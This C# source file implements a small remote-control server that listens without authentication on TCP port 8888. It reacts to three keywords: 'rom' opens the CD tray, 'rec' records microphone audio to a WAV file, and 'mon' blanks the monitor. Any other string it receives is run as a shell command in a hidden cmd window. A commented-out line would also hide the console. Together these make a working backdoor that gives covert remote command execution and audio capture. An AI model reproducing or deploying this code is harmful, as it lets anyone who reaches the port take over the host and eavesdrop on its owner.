using System;
using System.Net.Sockets;
using System.Net;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Media;
using System.Timers;
using Microsoft.VisualBasic;
using System.Threading;
using System.Diagnostics;

namespace SServer
{
    public class SServer
    {
        private const int MONITOR_ON = -1;
        private const int MONITOR_OFF = 2;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MONITORPOWER = 0xF170;
        private const int HWND_BROADCAST = 0xffff;
        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static void Main(string[] args)
        {
            //const int SW_HIDE = 0;
            var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);
            IntPtr ptr = IntPtr.Zero;
            StringBuilder returnstring = new StringBuilder();
            byte[] bytes = new byte[1024];
            Socket sListener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                sListener.Bind(new IPEndPoint(IPAddress.Any, 8888));
                sListener.Listen(10);
                while (true)
                {
                    Console.WriteLine("Waiting for connections... ");
                    Socket handler = sListener.Accept();
                    string data = null;
                    int bytesRec = handler.Receive(bytes);
                    data += Encoding.ASCII.GetString(bytes, 0, bytesRec);
                    Console.WriteLine("Сlient Message : {0}", data);
                    if (data == "rom")
                    {
                        Thread.CurrentThread.Join(5000);
                        mciSendString("set CDAudio door open", returnstring, 127, IntPtr.Zero);
                    }
                    else
                        if (data == "rec")
                        {
                            mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                            mciSendString("record recsound", "", 0, 0);
                            Thread.CurrentThread.Join(5000);
                            mciSendString(@"save recsound tempsv.wav", "", 0, 0);
                            mciSendString("close recsound ", "", 0, 0);
                            SoundPlayer s = new SoundPlayer("tempsv.wav");
                            s.Play();
                        }
                    if (data == "mon")
                    {
                        Thread.CurrentThread.Join(5000);
                        IntPtr foregroundWindow = GetForegroundWindow();
                        if (foregroundWindow == IntPtr.Zero)
                            foregroundWindow = (IntPtr)HWND_BROADCAST;
                        SendMessage(foregroundWindow, WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)MONITOR_OFF);
                        Thread.CurrentThread.Join(5000);
                        SendMessage(foregroundWindow, WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)MONITOR_ON);
                    }
                    else
                    {
                        Thread.CurrentThread.Join(5000);
                        ProcessStartInfo exe = new ProcessStartInfo("cmd", "/c cd D:/ && " + data);
                        exe.WindowStyle = ProcessWindowStyle.Hidden;
                        Process.Start(exe);
                    };
                    string theReply = "COMMAND DONE!!!";
                    byte[] msg = Encoding.ASCII.GetBytes(theReply);
                    int bytesSent = handler.Send(msg);
                    handler.Send(msg);
                    handler.Shutdown(SocketShutdown.Both);
                    handler.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
}